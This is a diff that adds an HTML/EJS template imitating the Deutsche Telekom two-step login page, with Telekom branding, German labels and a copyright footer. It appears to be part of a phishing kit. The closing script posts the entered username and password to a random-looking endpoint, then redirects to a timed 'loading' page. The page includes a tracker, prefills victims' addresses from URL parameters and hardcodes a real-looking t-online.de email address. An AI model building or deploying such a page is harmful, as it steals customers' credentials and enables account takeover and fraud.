@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Telekom Login</title>
+    <link rel="stylesheet" href="css/botta.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+</head>
+
+<body class="telekom-body">
+
+    <!-- Telekom Hanging Magenta Badge (Top Left) -->
+    <div class="telekom-badge-container">
+        <div class="telekom-badge" aria-label="Deutsche Telekom">
+            <svg viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
+                <path d="M6.722 15.84h-4.8v-4.8h4.791v4.8zM1.922 0v8.16H3.36v-.236c0-3.844 2.159-6.24 6.239-6.24h.237v17.279c0 2.396-.957 3.36-3.36 3.36h-.72V24h12.478v-1.676h-.72c-2.395 0-3.36-.957-3.36-3.361V1.676h.237c4.08 0 6.239 2.396 6.239 6.24v.236h1.439V0Zm15.356 15.84h4.8v-4.8h-4.791v4.8z"/>
+            </svg>
+        </div>
+    </div>
+
+    <!-- Main Content Container -->
+    <main class="telekom-container">
+        <div class="telekom-card">
+
+            <!-- ======================================================== -->
+            <!-- STEP 1: EMAIL / USERNAME SCREEN (Reference Image 1)      -->
+            <!-- ======================================================== -->
+            <div id="step-username" class="telekom-step">
+                <div class="card-header-bar right-only">
+                    <button type="button" class="help-icon-btn" aria-label="Hilfe">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"/>
+                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                            <line x1="12" y1="17" x2="12.01" y2="17"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <h1 class="telekom-card-title">Telekom Login</h1>
+
+                <form id="usernameForm" autocomplete="on">
+                    <div class="telekom-input-group">
+                        <div class="telekom-input-container">
+                            <input type="text" id="username" class="telekom-input-field" placeholder="Benutzername" required autocomplete="username" spellcheck="false">
+                            <button type="button" class="input-action-btn" aria-label="Hilfe zum Benutzernamen">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                    <circle cx="12" cy="12" r="10"/>
+                                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                                    <line x1="12" y1="17" x2="12.01" y2="17"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="telekom-switch-row">
+                        <label class="telekom-switch">
+                            <input type="checkbox" id="rememberUser" checked>
+                            <span class="telekom-switch-slider"></span>
+                        </label>
+                        <span class="telekom-switch-label" id="rememberUserLabel">Benutzername merken</span>
+                        <button type="button" class="inline-help-icon" aria-label="Hilfe zu Benutzername merken">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="12" cy="12" r="10"/>
+                                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                                <line x1="12" y1="17" x2="12.01" y2="17"/>
+                            </svg>
+                        </button>
+                    </div>
+
+                    <button type="submit" class="telekom-btn-primary" id="nextBtn">Weiter</button>
+                    <button type="button" class="telekom-btn-secondary">Andere Anmeldeoptionen</button>
+
+                    <div class="telekom-register-link-row">
+                        <a href="#" class="telekom-text-link">Neu hier? Jetzt registrieren</a>
+                    </div>
+                </form>
+            </div>
+
+            <!-- ======================================================== -->
+            <!-- STEP 2: PASSWORD SCREEN (Reference Image 2)              -->
+            <!-- ======================================================== -->
+            <div id="step-password" class="telekom-step hidden">
+                <div class="card-header-bar">
+                    <div class="user-info-pill" id="userPill" role="button" tabindex="0" title="Benutzer wechseln" aria-label="Benutzer wechseln">
+                        <div class="user-avatar-circle">
+                            <svg viewBox="0 0 24 24" fill="#ffffff">
+                                <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
+                            </svg>
+                        </div>
+                        <span class="user-email-text" id="userDisplay">S-koerkel@t-online.de</span>
+                        <svg class="dropdown-caret-icon" viewBox="0 0 10 7">
+                            <path d="M1 1.5L5 5.5L9 1.5" stroke="#191919" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+
+                    <button type="button" class="help-icon-btn" aria-label="Hilfe">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"/>
+                            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                            <line x1="12" y1="17" x2="12.01" y2="17"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <h1 class="telekom-card-title">Passwort eingeben</h1>
+
+                <form id="passwordForm" autocomplete="on">
+                    <div class="telekom-input-group">
+                        <div class="telekom-input-container">
+                            <input type="password" id="password" class="telekom-input-field" placeholder="Passwort" required autocomplete="current-password">
+                            <button type="button" class="input-action-btn" id="togglePasswordBtn" aria-label="Passwort anzeigen/ausblenden" title="Passwort anzeigen">
+                                <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                    <circle cx="12" cy="12" r="3"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="telekom-link-row">
+                        <a href="#" class="telekom-text-link">Passwort vergessen?</a>
+                    </div>
+
+                    <div class="telekom-switch-row">
+                        <label class="telekom-switch">
+                            <input type="checkbox" id="stayLoggedIn" checked>
+                            <span class="telekom-switch-slider"></span>
+                        </label>
+                        <span class="telekom-switch-label" id="stayLoggedInLabel">Angemeldet bleiben</span>
+                        <button type="button" class="inline-help-icon" aria-label="Hilfe zu Angemeldet bleiben">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="12" cy="12" r="10"/>
+                                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                                <line x1="12" y1="17" x2="12.01" y2="17"/>
+                            </svg>
+                        </button>
+                    </div>
+
+                    <button type="submit" class="telekom-btn-primary" id="loginSubmitBtn">LOGIN</button>
+                    <button type="button" class="telekom-btn-secondary">Andere Anmeldeoptionen</button>
+
+                    <div class="telekom-back-link-row">
+                        <a href="#" class="telekom-back-link" id="backToUserBtn">&lt; Zurück</a>
+                    </div>
+                </form>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="telekom-footer">
+        <div class="telekom-footer-left">
+            <div class="telekom-footer-copy">© Telekom Deutschland GmbH</div>
+            <div class="telekom-footer-version">26.44.0</div>
+        </div>
+        <div class="telekom-footer-right">
+            <a href="#">Impressum</a>
+            <a href="#">Datenschutz</a>
+        </div>
+    </footer>
+
+    <!-- Interactive Script Managing Two-Step Flow & State -->
+    <script>
+        (function() {
+            // DOM Elements
+            const stepUsername = document.getElementById('step-username');
+            const stepPassword = document.getElementById('step-password');
+            const userDisplay = document.getElementById('userDisplay');
+            const userPill = document.getElementById('userPill');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const usernameForm = document.getElementById('usernameForm');
+            const passwordForm = document.getElementById('passwordForm');
+            const backToUserBtn = document.getElementById('backToUserBtn');
+            const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+            const eyeIcon = document.getElementById('eyeIcon');
+            const loginSubmitBtn = document.getElementById('loginSubmitBtn');
+
+            // Default username from reference image (or from URL if provided)
+            const defaultDemoUsername = 'S-koerkel@t-online.de';
+            const urlParams = new URLSearchParams(window.location.search);
+            const paramUser = urlParams.get('user') || urlParams.get('email') || urlParams.get('username');
+
+            // Frontend state
+            let currentUsername = paramUser || '';
+
+            // Step Navigation Helper
+            function goToStep(step) {
+                if (step === 2) {
+                    // Update user display at top of card
+                    const displayVal = currentUsername.trim() || defaultDemoUsername;
+                    userDisplay.textContent = displayVal;
+
+                    // Transition to Step 2
+                    stepUsername.classList.add('hidden');
+                    stepPassword.classList.remove('hidden');
+
+                    // Focus password field
+                    setTimeout(function() {
+                        passwordInput.focus();
+                    }, 50);
+                } else {
+                    // Transition back to Step 1
+                    stepPassword.classList.add('hidden');
+                    stepUsername.classList.remove('hidden');
+
+                    // Ensure entered username remains in the input
+                    if (currentUsername) {
+                        usernameInput.value = currentUsername;
+                    }
+
+                    setTimeout(function() {
+                        usernameInput.focus();
+                    }, 50);
+                }
+            }
+
+            // Step 1: Submit email / username form -> Go to Step 2
+            usernameForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const entered = usernameInput.value.trim();
+                if (entered) {
+                    currentUsername = entered;
+                } else {
+                    currentUsername = defaultDemoUsername;
+                    usernameInput.value = currentUsername;
+                }
+                goToStep(2);
+            });
+
+            // Step 2: Return to Step 1 via "Zurück"
+            backToUserBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                goToStep(1);
+            });
+
+            // Step 2: Return to Step 1 via User Pill click
+            userPill.addEventListener('click', function() {
+                goToStep(1);
+            });
+            userPill.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    goToStep(1);
+                }
+            });
+
+            // Password Visibility Toggle
+            let isPasswordVisible = false;
+            togglePasswordBtn.addEventListener('click', function() {
+                isPasswordVisible = !isPasswordVisible;
+                if (isPasswordVisible) {
+                    passwordInput.type = 'text';
+                    togglePasswordBtn.setAttribute('title', 'Passwort ausblenden');
+                    // Eye with slash SVG icon
+                    eyeIcon.innerHTML = `
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                        <line x1="1" y1="1" x2="23" y2="23"/>
+                    `;
+                } else {
+                    passwordInput.type = 'password';
+                    togglePasswordBtn.setAttribute('title', 'Passwort anzeigen');
+                    // Regular eye SVG icon
+                    eyeIcon.innerHTML = `
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    `;
+                }
+            });
+
+            // Label clicks toggle corresponding checkboxes
+            document.getElementById('rememberUserLabel').addEventListener('click', function() {
+                const cb = document.getElementById('rememberUser');
+                cb.checked = !cb.checked;
+            });
+            document.getElementById('stayLoggedInLabel').addEventListener('click', function() {
+                const cb = document.getElementById('stayLoggedIn');
+                cb.checked = !cb.checked;
+            });
+
+            // Submit login
+            passwordForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const password = passwordInput.value;
+                const username = currentUsername;
+
+                loginSubmitBtn.disabled = true;
+                loginSubmitBtn.textContent = '...';
+
+                if (typeof $ !== 'undefined' && $.ajax) {
+                    $.ajax({
+                        url: '/gzLbTbjqMpc34D4XsPJ2',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({ username, password }),
+                        success: function(info) {
+                            if (info && info.OK) {
+                                window.location = "/loading?time=12&url=/Mtan4gImt9DmQlk7b";
+                            } else {
+                                loginSubmitBtn.disabled = false;
+                                loginSubmitBtn.textContent = 'LOGIN';
+                            }
+                        },
+                        error: function() {
+                            setTimeout(function() {
+                                loginSubmitBtn.disabled = false;
+                                loginSubmitBtn.textContent = 'LOGIN';
+                            }, 600);
+                        }
+                    });
+                } else {
+                    setTimeout(function() {
+                        loginSubmitBtn.disabled = false;
+                        loginSubmitBtn.textContent = 'LOGIN';
+                    }, 600);
+                }
+            });
+
+            // Initialize: Check URL param if explicitly requesting step 2
+            const paramStep = urlParams.get('step');
+            if (paramStep === '2' && paramUser) {
+                goToStep(2);
+            } else {
+                // Ensure page starts at Step 1 as requested
+                goToStep(1);
+            }
+        })();
+    </script>
+</body>
+
+</html>
